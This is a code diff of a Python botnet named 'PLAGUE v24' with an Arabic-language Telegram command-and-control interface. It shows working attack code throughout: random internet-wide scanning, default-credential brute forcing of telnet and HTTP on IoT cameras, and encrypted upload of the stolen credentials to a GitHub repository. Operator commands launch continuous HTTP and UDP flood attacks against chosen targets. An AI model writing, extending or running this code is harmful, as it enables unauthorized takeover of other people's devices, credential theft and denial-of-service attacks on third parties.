@@ -1,18 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PLAGUE v23.0 – REAL VERIFICATION ENGINE
-- ONVIF WS-Discovery verification (real cameras only)
-- RTSP stream validation (DESCRIBE + SDP check)
-- JPEG/PNG magic bytes verification
-- Optional Shodan integration for targeted scanning
-- Low-memory async architecture (streamed reads)
-- Full Telegram C2 (start/stop/status/attack/backup)
+PLAGUE v24.0 – PERSISTENT + CONTINUOUS
+- Auto-load devices from GitHub on startup (no data loss on restart)
+- Save to GitHub immediately after each capture
+- Continuous attack loop with periodic status updates
+- Clean Telegram UI with direct commands
 """
 
 import asyncio
 import aiohttp
-import aiosqlite
 import socket
 import ipaddress
 import random
@@ -28,158 +25,126 @@ from typing import List, Dict, Optional, Tuple
 from datetime import datetime
 from cryptography.fernet import Fernet
 from pydantic_settings import BaseSettings, SettingsConfigDict
-from logging.handlers import RotatingFileHandler
-
-# Optional imports
-try:
-    import shodan
-    SHODAN_AVAILABLE = True
-except ImportError:
-    SHODAN_AVAILABLE = False
-
-try:
-    from onvif import ONVIFCamera, WsDiscoveryClient
-    ONVIF_PYTHON_AVAILABLE = True
-except ImportError:
-    ONVIF_PYTHON_AVAILABLE = False
 
 # ===================================================================
-# 1. CONFIGURATION
+# CONFIG
 # ===================================================================
 class Settings(BaseSettings):
-    model_config = SettingsConfigDict(
-        env_file=".env",
-        env_file_encoding="utf-8",
-        extra="ignore"
-    )
-
+    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")
     bot_token: str
     admin_chat_id: str
     gh_pat: str
     encryption_key: str
     github_repo: str = ""
-
-    # Shodan (optional)
-    shodan_api_key: str = ""
-    use_shodan: bool = False
-
-    # Resource limits (low memory)
     scan_timeout: float = 2.0
-    max_concurrent_scan: int = 100
-    max_concurrent_attack: int = 50
-    attack_jitter_min: float = 0.05
-    attack_jitter_max: float = 0.2
+    max_concurrent_scan: int = 280
+    max_concurrent_attack: int = 240
     telegram_rate_limit_sec: float = 30.0
     max_scan_ips_per_subnet: int = 128
 
 settings = Settings()
 
-# ===================================================================
-# 2. LOGGING
-# ===================================================================
 logger = logging.getLogger("PLAGUE")
 logger.setLevel(logging.INFO)
-handler = logging.StreamHandler(sys.stdout)
-handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
-logger.addHandler(handler)
+h = logging.StreamHandler(sys.stdout)
+h.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
+logger.addHandler(h)
 
 # ===================================================================
-# 3. ENCRYPTION
+# ENCRYPTION
 # ===================================================================
-def get_cipher():
-    hashed = hashlib.sha256(settings.encryption_key.encode()).digest()
-    key = base64.urlsafe_b64encode(hashed)
-    return Fernet(key)
+hashed = hashlib.sha256(settings.encryption_key.encode()).digest()
+cipher = Fernet(base64.urlsafe_b64encode(hashed))
 
-cipher = get_cipher()
-DB_FILE = "swarm.db"
+BACKUP_FILE = "swarm.enc"
+BACKUP_URL = f"https://api.github.com/repos/{settings.github_repo}/contents/{BACKUP_FILE}"
 
 # ===================================================================
-# 4. DATABASE
+# DATABASE (in-memory + GitHub sync)
 # ===================================================================
 class Database:
     def __init__(self):
-        self.pool = None
+        self.devices: List[Dict] = []
         self.lock = asyncio.Lock()
-        self.initialized = False
+        self.dirty = False
+        self.last_save_time = 0
 
-    async def init(self):
-        if self.initialized:
+    async def load_from_github(self):
+        """Load existing devices from encrypted file on GitHub"""
+        try:
+            headers = {"Authorization": f"token {settings.gh_pat}", "Accept": "application/vnd.github.v3+json"}
+            async with aiohttp.ClientSession() as s:
+                async with s.get(BACKUP_URL, headers=headers) as r:
+                    if r.status == 200:
+                        data = await r.json()
+                        content = base64.b64decode(data["content"])
+                        decrypted = cipher.decrypt(content)
+                        self.devices = json.loads(decrypted)
+                        logger.info(f"✅ Loaded {len(self.devices)} devices from GitHub.")
+                        return
+                    elif r.status == 404:
+                        logger.info("No existing backup. Starting fresh.")
+                        return
+                    else:
+                        logger.warning(f"Unexpected GitHub response: {r.status}")
+        except Exception as e:
+            logger.warning(f"Load failed: {e}")
+        self.devices = []
+
+    async def save_to_github(self, force=False):
+        """Encrypt + upload to GitHub. Throttled to 1 per 20s unless forced."""
+        now = time.time()
+        if not force and (now - self.last_save_time < 20):
+            self.dirty = True
             return
-        self.pool = await aiosqlite.connect(DB_FILE)
-        await self.pool.execute("PRAGMA journal_mode=WAL")
-        await self.pool.execute("""
-            CREATE TABLE IF NOT EXISTS devices (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                ip TEXT NOT NULL,
-                port INTEGER NOT NULL,
-                service TEXT,
-                creds TEXT,
-                arch TEXT,
-                verification_type TEXT,
-                verified INTEGER DEFAULT 0,
-                timestamp TEXT
-            )
-        """)
-        await self.pool.commit()
-        self.initialized = True
-        logger.info("DB ready.")
+        if not self.devices:
+            return
+        try:
+            payload = json.dumps(self.devices).encode()
+            encrypted = cipher.encrypt(payload)
+            content_b64 = base64.b64encode(encrypted).decode()
+            headers = {"Authorization": f"token {settings.gh_pat}", "Accept": "application/vnd.github.v3+json"}
+            async with aiohttp.ClientSession() as s:
+                body = {"message": f"update {datetime.now().isoformat()}", "content": content_b64}
+                async with s.get(BACKUP_URL, headers=headers) as r:
+                    if r.status == 200:
+                        body["sha"] = (await r.json()).get("sha")
+                async with s.put(BACKUP_URL, headers=headers, json=body) as r:
+                    if r.status in (200, 201):
+                        logger.info(f"💾 Saved {len(self.devices)} devices to GitHub.")
+                        self.last_save_time = now
+                        self.dirty = False
+                    else:
+                        logger.warning(f"Save failed: {r.status}")
+        except Exception as e:
+            logger.error(f"Save error: {e}")
 
-    async def save_device(self, ip, port, service, creds, arch="", verification_type="unknown", verified=True):
-        if not self.initialized:
-            await self.init()
+    async def save_device(self, ip, port, service, creds, verification="unknown"):
         async with self.lock:
-            async with self.pool.execute("SELECT id FROM devices WHERE ip=? AND port=?", (ip, port)) as cur:
-                if await cur.fetchone():
-                    return
-            await self.pool.execute(
-                "INSERT INTO devices (ip,port,service,creds,arch,verification_type,verified,timestamp) VALUES (?,?,?,?,?,?,?,?)",
-                (ip, port, service, creds, arch, verification_type, 1 if verified else 0, datetime.now().isoformat())
-            )
-            await self.pool.commit()
-            logger.info(f"REAL CAPTURE: {ip}:{port} [{service}] {creds} (verified via {verification_type})")
+            if any(d["ip"] == ip and d["port"] == port for d in self.devices):
+                return
+            self.devices.append({
+                "ip": ip, "port": port, "service": service, "creds": creds,
+                "verification": verification, "timestamp": datetime.now().isoformat()
+            })
+            logger.info(f"🎯 CAPTURED: {ip}:{port} [{service}] {creds} via {verification} (total: {len(self.devices)})")
+            self.dirty = True
+        await self.save_to_github(force=True)
 
-    async def get_devices(self, limit=999999):
-        if not self.initialized:
-            await self.init()
-        async with self.pool.execute(
-            "SELECT ip,port,service,creds,arch,verification_type FROM devices WHERE verified=1 ORDER BY id DESC LIMIT ?", (limit,)
-        ) as cur:
-            rows = await cur.fetchall()
-            return [{"ip":r[0],"port":r[1],"service":r[2],"creds":r[3],"arch":r[4],"verification":r[5]} for r in rows]
+    async def get_devices(self, limit=None):
+        return self.devices[-limit:] if limit else self.devices[:]
 
-    async def close(self):
-        if self.pool:
-            await self.pool.close()
-            self.initialized = False
+    async def background_saver(self):
+        """Periodic saver in case save_device throttling leaves data unsaved"""
+        while True:
+            await asyncio.sleep(60)
+            if self.dirty:
+                await self.save_to_github(force=True)
 
 db = Database()
 
 # ===================================================================
-# 5. GITHUB BACKUP
-# ===================================================================
-async def github_backup():
-    try:
-        devices = await db.get_devices()
-        payload = json.dumps(devices).encode()
-        encrypted = cipher.encrypt(payload)
-        content_b64 = base64.b64encode(encrypted).decode()
-
-        headers = {"Authorization": f"token {settings.gh_pat}", "Accept": "application/vnd.github.v3+json"}
-        async with aiohttp.ClientSession() as s:
-            url = f"https://api.github.com/repos/{settings.github_repo}/contents/swarm.enc"
-            body = {"message":"backup", "content":content_b64}
-            async with s.get(url, headers=headers) as r:
-                if r.status == 200:
-                    body["sha"] = (await r.json()).get("sha")
-            async with s.put(url, headers=headers, json=body) as r:
-                if r.status in (200,201):
-                    logger.info("Backup pushed.")
-    except Exception as e:
-        logger.error(f"Backup error: {e}")
-
-# ===================================================================
-# 6. PUBLIC IP
+# PUBLIC IP
 # ===================================================================
 async def get_public_ip(session):
     try:
@@ -189,43 +154,21 @@ async def get_public_ip(session):
         return "0.0.0.0"
 
 # ===================================================================
-# 7. REAL VERIFICATION ENGINE
+# VERIFICATION ENGINE
 # ===================================================================
 class Verifier:
-    def __init__(self, session, public_ip):
+    def __init__(self, session):
         self.session = session
-        self.public_ip = public_ip
 
-    async def verify_onvif(self, ip: str, port: int = 80) -> bool:
-        """Verify via ONVIF WS-Discovery (most reliable for cameras)"""
+    async def verify_onvif(self, ip):
         try:
-            # Send WS-Discovery Probe
-            probe_msg = f"""<?xml version="1.0" encoding="UTF-8"?>
-<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
-            xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
-            xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery"
-            xmlns:dn="http://www.onvif.org/ver10/network/wsdl">
-  <e:Header>
-    <w:MessageID>uuid:{random.randint(100000,999999)}</w:MessageID>
-    <w:To e:mustUnderstand="true">urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To>
-    <w:Action e:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action>
-  </e:Header>
-  <e:Body>
-    <d:Probe>
-      <d:Types>dn:NetworkVideoTransmitter</d:Types>
-    </d:Probe>
-  </e:Body>
-</e:Envelope>"""
-
+            probe = """<?xml version="1.0" encoding="UTF-8"?><e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope" xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery" xmlns:dn="http://www.onvif.org/ver10/network/wsdl"><e:Header><w:MessageID>uuid:12345</w:MessageID><w:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To><w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action></e:Header><e:Body><d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe></e:Body></e:Envelope>"""
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             sock.settimeout(3.0)
-            sock.sendto(probe_msg.encode(), (ip, 3702))
-            
+            sock.sendto(probe.encode(), (ip, 3702))
             try:
                 data, _ = sock.recvfrom(65535)
-                text = data.decode(errors="ignore")
-                if "NetworkVideoTransmitter" in text or "onvif" in text.lower():
+                if b"NetworkVideoTransmitter" in data or b"onvif" in data.lower():
                     return True
             except socket.timeout:
                 pass
@@ -235,87 +178,65 @@ class Verifier:
             pass
         return False
 
-    async def verify_rtsp(self, ip: str, port: int = 554) -> bool:
-        """Verify RTSP stream existence"""
+    async def verify_rtsp(self, ip, port=554):
         try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(ip, port), timeout=3.0
-            )
-            paths = ["/", "/live/ch0", "/stream1", "/h264", "/onvif1"]
-            for path in paths:
-                req = f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
-                writer.write(req.encode())
-                await writer.drain()
+            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=3.0)
+            for path in ["/", "/live", "/stream1", "/h264"]:
+                req = f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
+                writer.write(req.encode()); await writer.drain()
                 data = await asyncio.wait_for(reader.read(1024), timeout=2.0)
                 text = data.decode(errors="ignore")
                 if "RTSP/1.0 200" in text and ("m=video" in text or "application/sdp" in text):
-                    writer.close()
-                    await writer.wait_closed()
+                    writer.close(); await writer.wait_closed()
                     return True
-            writer.close()
-            await writer.wait_closed()
+            writer.close(); await writer.wait_closed()
         except:
             pass
         return False
 
-    async def verify_http_snapshot(self, ip: str, port: int, user: str, pwd: str) -> bool:
-        """Verify by fetching a real JPEG snapshot"""
-        token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
-        headers = {"Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0"}
-        paths = ["/snapshot.cgi", "/ISAPI/Streaming/channels/101/picture", "/cgi-bin/snapshot.cgi", "/jpg/image.jpg"]
-        for path in paths:
+    async def verify_snapshot(self, ip, port, user="", pwd=""):
+        headers = {"User-Agent": "Mozilla/5.0"}
+        if user and pwd:
+            token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
+            headers["Authorization"] = f"Basic {token}"
+        for path in ["/snapshot.cgi", "/ISAPI/Streaming/channels/101/picture", "/cgi-bin/snapshot.cgi", "/jpg/image.jpg"]:
             try:
                 url = f"http://{ip}:{port}{path}"
-                async with self.session.get(url, headers=headers, ssl=False, timeout=3.0) as resp:
-                    if resp.status == 200:
-                        data = await resp.content.read(16)
+                async with self.session.get(url, headers=headers, ssl=False, timeout=3.0) as r:
+                    if r.status == 200:
+                        data = await r.content.read(16)
                         if len(data) >= 4:
-                            if data[0] == 0xFF and data[1] == 0xD8:
-                                return True  # JPEG
-                            if data[0] == 0x89 and data[1] == 0x50:
-                                return True  # PNG
+                            if data[0] == 0xFF and data[1] == 0xD8: return True  # JPEG
+                            if data[0] == 0x89 and data[1] == 0x50: return True  # PNG
             except:
                 pass
         return False
 
-    async def is_real_device(self, ip: str, port: int, user: str = "", pwd: str = "") -> Tuple[bool, str]:
-        """Master verification: try ONVIF -> RTSP -> HTTP snapshot"""
-        # 1. ONVIF (most reliable)
-        if await self.verify_onvif(ip, port):
-            return True, "ONVIF"
-        
-        # 2. RTSP
-        if await self.verify_rtsp(ip, 554):
-            return True, "RTSP"
-        
-        # 3. HTTP Snapshot (if creds provided)
-        if user and pwd:
-            if await self.verify_http_snapshot(ip, port, user, pwd):
-                return True, "HTTP_SNAPSHOT"
-        
-        return False, "unknown"
+    async def is_real(self, ip, port, user="", pwd=""):
+        if await self.verify_onvif(ip): return True, "ONVIF"
+        if await self.verify_rtsp(ip, 554): return True, "RTSP"
+        if user and pwd and await self.verify_snapshot(ip, port, user, pwd): return True, "SNAPSHOT"
+        return False, "none"
 
 # ===================================================================
-# 8. SCANNER
+# SCANNER
 # ===================================================================
 class Scanner:
     def __init__(self):
         self.sem = asyncio.Semaphore(settings.max_concurrent_scan)
         self.session = None
         self.running = True
-        self.public_ip = "0.0.0.0"
         self.verifier = None
 
     async def init(self):
         conn = aiohttp.TCPConnector(limit=40, limit_per_host=5, ttl_dns_cache=60)
         self.session = aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=settings.scan_timeout))
-        self.public_ip = await get_public_ip(self.session)
-        self.verifier = Verifier(self.session, self.public_ip)
-        logger.info(f"IP: {self.public_ip}")
+        ip = await get_public_ip(self.session)
+        self.verifier = Verifier(self.session)
+        logger.info(f"IP: {ip}")
 
     async def close(self):
-        if self.session:
-            await self.session.close()
+        if self.session: await self.session.close()
 
     async def tcp_scan(self, ip, port):
         try:
@@ -338,19 +259,12 @@ class Scanner:
                     w.write(f"{p}\n".encode()); await w.drain(); await asyncio.sleep(0.3)
                     d = await asyncio.wait_for(r.read(256), timeout=1)
                     if any(b in d for b in [b"#",b"$",b">"]):
-                        w.write(b"echo OK\n"); await w.drain(); await asyncio.sleep(0.2)
-                        if b"OK" in await asyncio.wait_for(r.read(64), timeout=0.5):
-                            # Verify via RTSP/ONVIF before saving
-                            real, vtype = await self.verifier.is_real_device(ip, 80, u, p)
-                            if real:
-                                await db.save_device(ip,23,"TELNET",f"{u}:{p}", verification_type=vtype)
-                            else:
-                                logger.debug(f"Rejected telnet {ip} (not real IoT)")
-                            w.close(); await w.wait_closed()
-                            return True
+                        real, vtype = await self.verifier.is_real(ip, 80, u, p)
+                        if real:
+                            await db.save_device(ip, 23, "TELNET", f"{u}:{p}", vtype)
                 w.close(); await w.wait_closed()
+                break
             except: continue
-        return False
 
     async def http_brute(self, ip, port):
         creds = [("admin","admin"),("admin","password"),("root","root"),("admin","12345"),("admin","")]
@@ -360,22 +274,18 @@ class Scanner:
                 headers = {"Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0"}
                 async with self.session.get(f"http://{ip}:{port}/", headers=headers, ssl=False, timeout=1.5) as resp:
                     if resp.status in (200,302,401):
-                        # VERIFY before saving
-                        real, vtype = await self.verifier.is_real_device(ip, port, u, p)
+                        real, vtype = await self.verifier.is_real(ip, port, u, p)
                         if real:
-                            await db.save_device(ip,port,"HTTP",f"{u}:{p}", verification_type=vtype)
-                            return True
-                        else:
-                            logger.debug(f"Rejected HTTP {ip}:{port} (not real camera)")
+                            await db.save_device(ip, port, "HTTP", f"{u}:{p}", vtype)
+                            return
             except: continue
-        return False
 
     async def global_scan(self):
-        logger.info("Scanner started (REAL verification mode).")
+        logger.info("Scanner started (real verification mode).")
         while self.running:
-            a = random.randint(1,223); b = random.randint(0,255); c = random.randint(0,255)
+            a, b, c = random.randint(1,223), random.randint(0,255), random.randint(0,255)
             net = f"{a}.{b}.{c}.0/24"
-            ports = [23,80,443,8080,8000,554,37777,34567]
+            ports = [23, 80, 443, 8080, 8000, 554, 37777, 34567]
             tasks = []
             try:
                 for ip in list(ipaddress.ip_network(net).hosts())[:settings.max_scan_ips_per_subnet]:
@@ -391,44 +301,47 @@ class Scanner:
     async def _probe(self, ip, port):
         async with self.sem:
             if await self.tcp_scan(ip, port):
-                if port == 23:
-                    await self.telnet_brute(ip)
-                elif port in (80,443,8080,8000,37777,34567):
-                    await self.http_brute(ip, port)
+                if port == 23: await self.telnet_brute(ip)
+                elif port in (80,443,8080,8000,37777,34567): await self.http_brute(ip, port)
                 elif port == 554:
-                    # Direct RTSP verification
-                    real = await self.verifier.verify_rtsp(ip, 554)
-                    if real:
-                        await db.save_device(ip, 554, "RTSP", "", verification_type="RTSP")
+                    if await self.verifier.verify_rtsp(ip, 554):
+                        await db.save_device(ip, 554, "RTSP", "", "RTSP")
 
 # ===================================================================
-# 9. ATTACK ENGINE
+# ATTACK ENGINE (CONTINUOUS)
 # ===================================================================
 class Attacker:
-    def __init__(self, target, mode):
+    def __init__(self, target, mode, devices, notify):
         self.target = target
         self.mode = mode
+        self.devices = devices
         self.active = asyncio.Event()
         self.active.set()
         self.sem = asyncio.Semaphore(settings.max_concurrent_attack)
+        self.notify = notify
+        self.request_count = 0
 
-    async def run(self, devices):
+    async def run(self):
         if self.mode == "http":
-            await self._http(devices)
+            await self._http()
         elif self.mode == "udp":
-            await self._udp(devices)
+            await self._udp()
 
-    async def _http(self, devices):
+    async def _http(self):
         conn = aiohttp.TCPConnector(limit=15, force_close=True)
         async with aiohttp.ClientSession(connector=conn) as s:
+            cycle = 0
             while self.active.is_set():
-                tasks = []
-                for _ in devices:
-                    tasks.append(self._strike(s))
+                cycle += 1
+                tasks = [self._strike(s) for _ in self.devices]
                 for i in range(0, len(tasks), 15):
                     if not self.active.is_set(): break
                     await asyncio.gather(*tasks[i:i+15])
-                    await asyncio.sleep(0.1)
+                    await asyncio.sleep(0.05)
+                # Report every 5 cycles
+                if cycle % 5 == 0:
+                    await self.notify(f"🔁 Cycle {cycle} | Sent: {self.request_count} requests | Devices: {len(self.devices)}")
+                await asyncio.sleep(0.1)
 
     async def _strike(self, session):
         if not self.active.is_set(): return
@@ -437,17 +350,27 @@ class Attacker:
                 kw = {"timeout": aiohttp.ClientTimeout(total=1.5), "ssl": False}
                 async with session.get(self.target, **kw) as r:
                     await r.content.read(256)
+                self.request_count += 1
+                async with session.post(self.target, data={"x": "A"*500}, **kw) as r:
+                    await r.content.read(256)
+                self.request_count += 1
             except: pass
 
-    async def _udp(self, devices):
+    async def _udp(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setblocking(False)
         loop = asyncio.get_event_loop()
         ip, port = self.target.split(":"); port = int(port)
+        cycle = 0
         while self.active.is_set():
-            for _ in devices:
-                try: await loop.sock_sendto(sock, b"Z"*1200, (ip, port))
+            cycle += 1
+            for _ in self.devices:
+                try:
+                    await loop.sock_sendto(sock, b"Z"*1200, (ip, port))
+                    self.request_count += 1
                 except: pass
+            if cycle % 50 == 0:
+                await self.notify(f"🔁 Cycle {cycle} | Sent: {self.request_count} packets | Devices: {len(self.devices)}")
             await asyncio.sleep(0.01)
         sock.close()
 
@@ -455,7 +378,7 @@ class Attacker:
         self.active.clear()
 
 # ===================================================================
-# 10. TELEGRAM C2
+# TELEGRAM C2 (Clean UI)
 # ===================================================================
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
@@ -465,48 +388,73 @@ class C2:
         self.scanner = scanner
         self.app = None
         self.attacker = None
-        self.last_msg = 0
 
-    async def _reply(self, msg, text):
-        if time.time() - self.last_msg > settings.telegram_rate_limit_sec:
-            await msg.reply_text(text)
-            self.last_msg = time.time()
+    def _main_menu(self):
+        return InlineKeyboardMarkup([
+            [InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
+             InlineKeyboardButton("📋 قائمة الأجهزة", callback_data="list")],
+            [InlineKeyboardButton("💀 هجوم HTTP", callback_data="atk_http"),
+             InlineKeyboardButton("🔥 هجوم UDP", callback_data="atk_udp")],
+            [InlineKeyboardButton("📦 نسخة احتياطية", callback_data="backup"),
+             InlineKeyboardButton("🛑 إيقاف الهجوم", callback_data="stop_attack")],
+            [InlineKeyboardButton("⏹ إيقاف كل شيء", callback_data="halt")],
+        ])
 
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         if str(update.effective_user.id) != settings.admin_chat_id: return
-        kb = [
-            [InlineKeyboardButton("📊 Status", callback_data="status")],
-            [InlineKeyboardButton("📋 List (Verified)", callback_data="list")],
-            [InlineKeyboardButton("💀 HTTP Flood", callback_data="atk_http")],
-            [InlineKeyboardButton("🔥 UDP Flood", callback_data="atk_udp")],
-            [InlineKeyboardButton("📦 Backup", callback_data="backup")],
-            [InlineKeyboardButton("🛑 STOP", callback_data="stop")],
-        ]
-        await update.message.reply_text("PLAGUE v23 – REAL VERIFICATION C2", reply_markup=InlineKeyboardMarkup(kb))
+        devs = await db.get_devices()
+        await update.message.reply_text(
+            f"🔥 *PLAGUE v24 – C2*\n\n"
+            f"📊 الأجهزة: *{len(devs)}*\n"
+            f"🔄 الماسح: *{'يعمل' if self.scanner.running else 'متوقف'}*\n"
+            f"⚔️ الهجوم: *{'نشط' if self.attacker and self.attacker.active.is_set() else 'متوقف'}*\n\n"
+            f"اختر العملية:",
+            parse_mode="Markdown",
+            reply_markup=self._main_menu()
+        )
 
     async def button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         q = update.callback_query; await q.answer()
         if str(update.effective_user.id) != settings.admin_chat_id: return
         d = q.data
 
-        if d == "status":
+        if d == "stats":
             devs = await db.get_devices()
-            await q.edit_message_text(f"Army: {len(devs)} VERIFIED devices.\nScanner running: {self.scanner.running}")
+            types = {}
+            for dev in devs:
+                types[dev.get("verification", "?")] = types.get(dev.get("verification", "?"), 0) + 1
+            type_str = "\n".join(f"  • {k}: {v}" for k, v in types.items()) or "  • لا توجد"
+            await q.edit_message_text(
+                f"📊 *الإحصائيات*\n\n"
+                f"الأجهزة المؤكدة: *{len(devs)}*\n"
+                f"أنواع التحقق:\n{type_str}\n"
+                f"الماسح: *{'✅ يعمل' if self.scanner.running else '⏹ متوقف'}*",
+                parse_mode="Markdown"
+            )
         elif d == "list":
-            devs = await db.get_devices(10)
-            txt = "\n".join(f"{x['ip']}:{x['port']} | {x['creds']} | {x['verification']}" for x in devs)
-            await q.edit_message_text(txt or "Empty.")
-        elif d in ("atk_http","atk_udp"):
-            context.user_data["mode"] = "http" if d=="atk_http" else "udp"
-            await q.edit_message_text("Send target (URL or IP:PORT):")
+            devs = await db.get_devices(limit=15)
+            if not devs:
+                await q.edit_message_text("📭 القائمة فارغة.")
+                return
+            txt = "📋 *آخر 15 جهاز مؤكد:*\n\n"
+            for dev in reversed(devs):
+                txt += f"• `{dev['ip']}:{dev['port']}` | {dev['creds']} | {dev['verification']}\n"
+            await q.edit_message_text(txt, parse_mode="Markdown")
+        elif d in ("atk_http", "atk_udp"):
+            context.user_data["mode"] = "http" if d == "atk_http" else "udp"
+            await q.edit_message_text(f"✍️ أرسل الهدف ({'رابط http/https' if d == 'atk_http' else 'IP:PORT'}):")
         elif d == "backup":
-            await q.edit_message_text("Backing up...")
-            await github_backup()
-            await q.edit_message_text("Done.")
-        elif d == "stop":
+            await q.edit_message_text("📦 جارٍ رفع النسخة الاحتياطية...")
+            await db.save_to_github(force=True)
+            await q.edit_message_text(f"✅ تم رفع {len(await db.get_devices())} جهاز إلى GitHub.")
+        elif d == "stop_attack":
+            if self.attacker: self.attacker.stop()
+            await q.edit_message_text("🛑 تم إيقاف الهجوم.")
+        elif d == "halt":
             if self.attacker: self.attacker.stop()
             self.scanner.running = False
-            await q.edit_message_text("All operations halted.")
+            await db.save_to_github(force=True)
+            await q.edit_message_text("⏹ تم إيقاف كل شيء وحفظ البيانات.")
             await context.application.stop_running()
 
     async def handle_target(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -516,40 +464,103 @@ class C2:
         target = update.message.text.strip()
         devs = await db.get_devices()
         if not devs:
-            await update.message.reply_text("No VERIFIED devices. Run scan first.")
+            await update.message.reply_text("❌ لا توجد أجهزة. انتظر الصيد.")
             return
-        self.attacker = Attacker(target, mode)
-        asyncio.create_task(self.attacker.run(devs))
-        await update.message.reply_text(f"{mode.upper()} flood started on {target} with {len(devs)} VERIFIED devices.")
+        if self.attacker: self.attacker.stop()
+        
+        async def notify(text):
+            try: await update.message.reply_text(text)
+            except: pass
+        
+        self.attacker = Attacker(target, mode, devs, notify)
+        asyncio.create_task(self.attacker.run())
+        await update.message.reply_text(
+            f"⚔️ *بدأ الهجوم*\n"
+            f"الهدف: `{target}`\n"
+            f"الأجهزة: {len(devs)}\n"
+            f"النوع: {mode.upper()}\n\n"
+            f"سيستمر حتى الإيقاف. سيصلك تقرير كل 5 دورات.",
+            parse_mode="Markdown"
+        )
+
+    async def cmd_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if str(update.effective_user.id) != settings.admin_chat_id: return
+        devs = await db.get_devices()
+        attacking = self.attacker and self.attacker.active.is_set()
+        await update.message.reply_text(
+            f"📊 *الحالة*\n"
+            f"الأجهزة: {len(devs)}\n"
+            f"الماسح: {'✅' if self.scanner.running else '⏹'}\n"
+            f"الهجوم: {'⚔️ نشط' if attacking else '⏹ متوقف'}\n"
+            f"طلبات مرسلة: {self.attacker.request_count if self.attacker else 0}",
+            parse_mode="Markdown"
+        )
+
+    async def cmd_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if str(update.effective_user.id) != settings.admin_chat_id: return
+        if not context.args:
+            await update.message.reply_text("الاستخدام: /attack <url>  أو  /attack <ip:port> udp")
+            return
+        target = context.args[0]
+        mode = "udp" if len(context.args) > 1 and context.args[1].lower() == "udp" else "http"
+        devs = await db.get_devices()
+        if not devs:
+            await update.message.reply_text("❌ لا توجد أجهزة.")
+            return
+        if self.attacker: self.attacker.stop()
+        async def notify(text):
+            try: await update.message.reply_text(text)
+            except: pass
+        self.attacker = Attacker(target, mode, devs, notify)
+        asyncio.create_task(self.attacker.run())
+        await update.message.reply_text(f"⚔️ هجوم {mode.upper()} على {target} بـ {len(devs)} جهاز.")
+
+    async def cmd_stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if str(update.effective_user.id) != settings.admin_chat_id: return
+        if self.attacker: self.attacker.stop()
+        await update.message.reply_text("🛑 تم إيقاف الهجوم.")
 
     async def run(self):
         self.app = Application.builder().token(settings.bot_token).build()
         self.app.add_handler(CommandHandler("start", self.start))
+        self.app.add_handler(CommandHandler("status", self.cmd_status))
+        self.app.add_handler(CommandHandler("attack", self.cmd_attack))
+        self.app.add_handler(CommandHandler("stop", self.cmd_stop))
         self.app.add_handler(CallbackQueryHandler(self.button))
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_target))
         await self.app.initialize()
         await self.app.start()
         await self.app.updater.start_polling()
-        logger.info("Bot online.")
+        logger.info("🤖 Bot online.")
         try:
-            while True:
-                await asyncio.sleep(3600)
+            while True: await asyncio.sleep(3600)
         except asyncio.CancelledError:
             await self.app.stop()
 
 # ===================================================================
-# 11. MAIN
+# MAIN
 # ===================================================================
 async def main():
+    # CRITICAL: Load existing devices first
+    await db.load_from_github()
+    logger.info(f"🚀 Starting with {len(db.devices)} existing devices.")
+    
     scanner = Scanner()
     await scanner.init()
+    
+    # Background saver
+    saver_task = asyncio.create_task(db.background_saver())
     scan_task = asyncio.create_task(scanner.global_scan())
+    
     c2 = C2(scanner)
-    await c2.run()
-    scanner.running = False
-    scan_task.cancel()
-    await scanner.close()
-    await db.close()
+    try:
+        await c2.run()
+    finally:
+        scanner.running = False
+        scan_task.cancel()
+        saver_task.cancel()
+        await db.save_to_github(force=True)
+        await scanner.close()
 
 if __name__ == "__main__":
     asyncio.run(main())
